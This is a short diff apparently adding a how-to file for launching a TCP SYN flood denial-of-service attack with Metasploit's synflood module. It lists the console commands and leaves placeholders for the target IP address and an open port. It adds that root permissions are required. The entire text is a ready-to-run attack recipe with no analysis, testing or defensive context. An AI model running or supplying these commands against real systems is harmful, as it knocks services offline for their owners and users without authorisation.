@@ -1,0 +1,8 @@
+run: msfconsole (metasploit)
+
+use auxiliary/dos/tcp/synflood
+set RHOSTS <ip that you want to attack>
+set RPORT <open tcp port>
+exploit
+
+requires sudo permitions
